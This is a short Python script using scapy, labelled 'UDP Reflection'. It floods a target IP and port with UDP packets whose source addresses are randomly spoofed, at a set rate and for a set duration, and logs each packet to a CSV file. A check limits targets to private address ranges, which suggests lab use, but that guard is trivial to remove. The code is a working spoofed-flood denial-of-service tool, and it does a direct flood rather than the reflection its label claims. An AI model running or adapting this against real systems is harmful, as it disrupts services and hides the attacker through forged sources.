#!/usr/bin/env python3
from scapy.all import *
import argparse
import time
import random
import os

def is_private_ip(ip):
    try:
        parts = list(map(int, ip.split(".")))
        if parts[0] == 127:
            return True
        if parts[0] == 10:
            return True
        if parts[0] == 172 and 16 <= parts[1] <= 31:
            return True
        if parts[0] == 192 and parts[1] == 168:
            return True
    except:
        pass
    return False

def main():
    parser = argparse.ArgumentParser(description="UDP Reflection")
    parser.add_argument("--target-ip", required=True)
    parser.add_argument("--target-port", type=int, required=True)
    parser.add_argument("--duration", type=int, required=True)
    parser.add_argument("--rate", type=int, required=True)
    parser.add_argument("--output", required=True)
    args = parser.parse_args()

    if not is_private_ip(args.target_ip):
        print(f"[ERROR] Target {args.target_ip} is not in the legal internal network. Access denied. ")
        exit(1)

    log_dir = os.path.dirname(args.output)
    if log_dir:
        os.makedirs(log_dir, exist_ok=True)

    start_time = time.time()
    with open(args.output, "w") as f:
        f.write("timestamp,src_ip,dst_ip,dst_port,action\n")

    while time.time() - start_time < args.duration:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
            ip = IP(src=src_ip, dst=args.target_ip)
            udp = UDP(sport=random.randint(1024,65535), dport=args.target_port)
            send(ip/udp, verbose=0)

            ts = time.strftime("%Y-%m-%dT%H:%M:%S")
            with open(args.output, "a") as f:
                f.write(f"{ts},{src_ip},{args.target_ip},{args.target_port},sent_udp\n")

            time.sleep(1.0 / args.rate)
        except Exception as e:
            with open(args.output, "a") as f:
                f.write(f"{time.strftime('%Y-%m-%dT%H:%M:%S')},ERROR,ERROR,ERROR,{str(e)}\n")

if __name__ == "__main__":
    main()
